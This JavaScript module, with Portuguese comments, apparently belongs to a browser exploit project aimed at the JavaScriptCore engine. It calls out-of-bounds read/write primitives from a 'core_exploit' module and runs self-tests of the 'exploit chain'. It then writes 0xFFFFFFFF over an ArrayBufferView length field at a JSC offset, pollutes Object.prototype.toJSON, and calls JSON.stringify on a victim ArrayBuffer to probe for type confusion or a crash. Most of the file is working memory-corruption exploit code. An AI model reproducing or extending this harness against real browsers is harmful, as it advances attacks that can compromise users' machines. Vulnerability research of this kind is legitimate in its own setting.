// js/script3/testArrayBufferVictimCrash.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs'; // PAUSE_S3 não está sendo usado aqui, mas pode ser mantido se planeja usar
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real, // Não é diretamente usado aqui após a refatoração para testes em core_exploit
    oob_write_absolute,    // Usado diretamente na lógica deste arquivo
    clearOOBEnvironment,
    selfTestOOBReadWrite,              // <<< NOVO: Importar self-test de R/W OOB
    selfTestArrayBufferTypeConfusion   // <<< NOVO: Importar self-test de Type Confusion
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs'; // OOB_CONFIG não é diretamente usado aqui

export const FNAME_MODULE_V28 = "ArrayBufferVictimCrashTest_v28";

const CRITICAL_OOB_WRITE_VALUE  = 0xFFFFFFFF;
const VICTIM_AB_SIZE = 64;

let toJSON_call_details_v28 = null;

// toJSON Ultra-Minimalista para este teste
function toJSON_V28_MinimalProbe() {
    toJSON_call_details_v28 = {
        probe_variant: "V28_MinimalProbe",
        this_type_in_toJSON: "N/A_before_call",
        error_in_toJSON: null,
        // Adicionamos probe_called para facilitar a verificação
        probe_called: false
    };
    try {
        toJSON_call_details_v28.probe_called = true;
        toJSON_call_details_v28.this_type_in_toJSON = Object.prototype.toString.call(this);
    } catch (e) {
        toJSON_call_details_v28.error_in_toJSON = `${e.name}: ${e.message}`;
    }
    return { minimal_probe_executed: true };
}


export async function executeArrayBufferVictimCrashTest() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_V28}.trigger`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Testando Crash com ArrayBuffer Vítima Pós-Corrupção ---`, "test", FNAME_CURRENT_TEST);
    document.title = `AB Victim Crash Test v28 Init`;

    // ---- INÍCIO: Executar auto-testes do core_exploit.mjs ----
    logS3(`>>> Iniciando verificação da cadeia de exploits do core_exploit...`, "test", FNAME_CURRENT_TEST);

    const oobRwTestResult = await selfTestOOBReadWrite(logS3);
    logS3(`Resultado do CoreExploit.selfTestOOBReadWrite: ${oobRwTestResult ? 'SUCESSO' : 'FALHA'}`,
          oobRwTestResult ? 'good' : 'critical', FNAME_CURRENT_TEST);

    // Pausa opcional se desejar separar visualmente os logs dos testes
    await PAUSE_S3(100);

    const typeConfusionCoreTestResult = await selfTestArrayBufferTypeConfusion(logS3);
    logS3(`Resultado do CoreExploit.selfTestArrayBufferTypeConfusion: ${typeConfusionCoreTestResult ? 'SUCESSO (Confusão Detectada)' : 'FALHA (Confusão NÃO Detectada ou Erro)'}`,
          typeConfusionCoreTestResult ? 'good' : 'critical', FNAME_CURRENT_TEST);

    if (!oobRwTestResult || !typeConfusionCoreTestResult) {
        logS3(`!!! ATENÇÃO: Um ou mais auto-testes do core_exploit falharam. O teste ${FNAME_CURRENT_TEST} pode não funcionar como esperado. !!!`, "warn", FNAME_CURRENT_TEST);
        // Você pode decidir se quer parar aqui ou continuar. Para logging, vamos continuar.
        // return { errorOccurred: new Error("Falha nos pré-testes do core_exploit."), potentiallyCrashed: false, stringifyResult: null, toJSON_details: null };
    }
    logS3(`<<< Verificação da cadeia de exploits do core_exploit concluída. Iniciando lógica principal de ${FNAME_CURRENT_TEST}...`, "test", FNAME_CURRENT_TEST);
    // ---- FIM: Executar auto-testes do core_exploit.mjs ----

    await PAUSE_S3(200); // Pausa para separar logs

    toJSON_call_details_v28 = null; // Resetar detalhes da sonda para este teste específico
    let errorCapturedMain = null;
    let stringifyOutput = null;
    let potentiallyCrashed = true;
    let lastStep = "init_main_logic";

    // O offset 0x58 + M_LENGTH_OFFSET, onde a estrutura fake 'm_length' foi plantada e depois sobrescrita criticamente
    const mLengthOffsetInView = parseInt(JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET, 16);
    if (isNaN(mLengthOffsetInView)) {
        logS3("ERRO CRÍTICO: JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET não é um número válido.", "critical", FNAME_CURRENT_TEST);
        // Limpa o ambiente OOB que pode ter sido configurado pelos self-tests antes de sair
        clearOOBEnvironment({ force_clear_even_if_not_setup: true });
        return { errorOccurred: new Error("Invalid M_LENGTH_OFFSET"), potentiallyCrashed: false, stringifyResult: null, toJSON_details: null };
    }
    // É importante notar que triggerOOB_primitive() DENTRO dos self-tests (com force_reinit: true)
    // já terá configurado o ambiente OOB. Se a lógica principal aqui também chamar triggerOOB_primitive(),
    // ela poderá reconfigurá-lo. Vamos assumir que a lógica principal aqui revalida/reconfigura o OOB se necessário.
    const corruptionTargetOffsetInOOBAB = 0x58 + mLengthOffsetInView;

    try {
        lastStep = "oob_setup_main_logic";
        // Garante que o ambiente OOB esteja pronto para a lógica principal deste teste.
        // Se os self-tests já configuraram, e não foi limpo, pode ser reutilizado.
        // Para garantir um estado limpo para ESTE teste específico, pode-se forçar reinit.
        // No entanto, os self-tests já usam force_reinit: true.
        // Se o último self-test (selfTestArrayBufferTypeConfusion) deixou o ambiente OOB configurado
        // e a corrupção que ele fez é a mesma que queremos aqui, poderíamos até pular a re-escrita OOB.
        // Mas para clareza e isolamento da lógica de corrupção deste teste específico, vamos reconfirmar o OOB.
        await triggerOOB_primitive({ force_reinit: false }); // Usar false se confiamos no setup dos self-tests, ou true para garantir
        if (!oob_array_buffer_real) { throw new Error("OOB Init falhou para a lógica principal."); }
        logS3("Ambiente OOB (re)confirmado para lógica principal.", "info", FNAME_CURRENT_TEST);
        logS3(`   Alvo da corrupção OOB em oob_array_buffer_real (lógica principal): ${toHex(corruptionTargetOffsetInOOBAB)}`, "info", FNAME_CURRENT_TEST);

        // PASSO 1 DA LÓGICA PRINCIPAL: Escrita OOB CRÍTICA
        // Esta escrita pode ser redundante se o selfTestArrayBufferTypeConfusion já a fez
        // e o oob_array_buffer_real não foi limpo/redefinido.
        // Para garantir que a corrupção desejada para ESTE teste esteja presente:
        lastStep = "critical_oob_write_main_logic";
        logS3(`PASSO 1 (Principal): Escrevendo valor CRÍTICO ${toHex(CRITICAL_OOB_WRITE_VALUE)} em oob_array_buffer_real[${toHex(corruptionTargetOffsetInOOBAB)}]...`, "warn", FNAME_CURRENT_TEST);
        oob_write_absolute(corruptionTargetOffsetInOOBAB, CRITICAL_OOB_WRITE_VALUE, 4);
        logS3(`  Escrita OOB crítica (principal) em ${toHex(corruptionTargetOffsetInOOBAB)} realizada.`, "info", FNAME_CURRENT_TEST);

        await PAUSE_S3(100);

        // PASSO 2 DA LÓGICA PRINCIPAL: Criar victim_ab e tentar JSON.stringify com toJSON poluído
        lastStep = "victim_creation_and_stringify_attempt_main_logic";
        let victim_ab = new ArrayBuffer(VICTIM_AB_SIZE);
        logS3(`PASSO 2 (Principal): victim_ab (${VICTIM_AB_SIZE} bytes) criado. Tentando JSON.stringify(victim_ab) com ${toJSON_V28_MinimalProbe.name}...`, "test", FNAME_CURRENT_TEST);

        const ppKey = 'toJSON';
        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        let pollutionApplied = false;

        try {
            Object.defineProperty(Object.prototype, ppKey, {
                value: toJSON_V28_MinimalProbe,
                writable: true, configurable: true, enumerable: false
            });
            pollutionApplied = true;
            logS3(`  Object.prototype.${ppKey} poluído com ${toJSON_V28_MinimalProbe.name} (principal).`, "info", FNAME_CURRENT_TEST);

            logS3(`  Chamando JSON.stringify(victim_ab) (principal)... (Este é o ponto esperado do Heisenbug Crash/Freeze)`, "warn", FNAME_CURRENT_TEST);
            document.title = `AB Victim Crash Test v28 - Stringifying...`;
            stringifyOutput = JSON.stringify(victim_ab);
            potentiallyCrashed = false; // Se chegamos aqui, não crashou silenciosamente

            logS3(`  JSON.stringify(victim_ab) (principal) completou. Resultado (da toJSON): ${stringifyOutput ? JSON.stringify(stringifyOutput) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);
            logS3(`  Detalhes da toJSON_V28_MinimalProbe (principal): ${toJSON_call_details_v28 ? JSON.stringify(toJSON_call_details_v28) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);

            if (toJSON_call_details_v28 && toJSON_call_details_v28.error_in_toJSON) { // Corrigido para error_in_toJSON
                logS3(`    ERRO DENTRO da ${toJSON_V28_MinimalProbe.name} (principal): ${toJSON_call_details_v28.error_in_toJSON}`, "error", FNAME_CURRENT_TEST);
                if(!errorCapturedMain) errorCapturedMain = new Error(toJSON_call_details_v28.error_in_toJSON);
            } else if (toJSON_call_details_v28 && toJSON_call_details_v28.probe_called) {
                logS3(`    ${toJSON_V28_MinimalProbe.name} (principal) foi chamada. Tipo de 'this': ${toJSON_call_details_v28.this_type_in_toJSON}`, "good", FNAME_CURRENT_TEST);
                if (toJSON_call_details_v28.this_type_in_toJSON !== "[object ArrayBuffer]") {
                    logS3(`      ALERTA (Principal): 'this' na toJSON NÃO ERA [object ArrayBuffer]! Tipo: ${toJSON_call_details_v28.this_type_in_toJSON}`, "critical", FNAME_CURRENT_TEST);
                    document.title = "TypeConfusion HEISENBUG (Principal)?";
                } else {
                    document.title = "AB Victim Test OK (Principal)";
                }
            }
        } catch (e_str) {
            errorCapturedMain = e_str;
            potentiallyCrashed = false;
            lastStep = "error_in_stringify_main_logic";
            logS3(`   ERRO CRÍTICO durante JSON.stringify(victim_ab) (principal): ${e_str.name} - ${e_str.message}`, "critical", FNAME_CURRENT_TEST);
            document.title = `ABVictim HEISENBUG (Principal): ${e_str.name}`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor);
                else delete Object.prototype[ppKey];
                 logS3(`  Object.prototype.${ppKey} restaurado (principal).`, "info", FNAME_CURRENT_TEST);
            }
        }

    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        potentiallyCrashed = false;
        logS3(`ERRO CRÍTICO GERAL no teste (principal): ${e_outer_main.name} - ${e_outer_main.message}`, "critical", FNAME_CURRENT_TEST);
        if (e_outer_main.stack) logS3(`Stack: ${e_outer_main.stack}`, "critical", FNAME_CURRENT_TEST);
        document.title = `${FNAME_MODULE_V28} (Principal) FALHOU: ${e_outer_main.name}`;
    } finally {
        // Limpa o ambiente OOB APENAS se este script for o responsável final.
        // Se outros scripts subsequentes esperam que ele permaneça, esta linha deve ser condicional.
        // Como os self-tests do core_exploit podem ser chamados de outros lugares,
        // eles são responsáveis por sua própria limpeza ou por deixar o ambiente se `force_reinit: false`.
        // Esta função, sendo um teste de nível superior, provavelmente deveria limpar ao final.
        clearOOBEnvironment({ force_clear_even_if_not_setup: true }); // Garante a limpeza no final deste teste específico.
        logS3(`--- ${FNAME_CURRENT_TEST} (Último passo: ${lastStep}) Concluído ---`, "test", FNAME_CURRENT_TEST);
    }
    return {
        errorOccurred: errorCapturedMain,
        potentiallyCrashed,
        stringifyResult: stringifyOutput,
        toJSON_details: toJSON_call_details_v28
    };
}
